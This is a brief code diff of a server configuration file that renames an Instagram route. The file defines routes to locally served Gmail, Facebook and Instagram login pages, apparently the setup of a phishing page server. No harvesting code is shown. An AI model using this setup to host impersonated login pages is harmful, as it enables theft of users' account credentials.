@@ -3,7 +3,7 @@ PORT = 80
 
 GMAIL_ROUTE = "/static/gmail/login"
 FACEBOOK_ROUTE = "/static/facebook/login"
-INSTAGRAM_ROUTE = "/static/instagram2/temp.php"
+INSTAGRAM_ROUTE = "/static/instagram/temp.php"
 
 STATIC_FOLDER = "static"
 
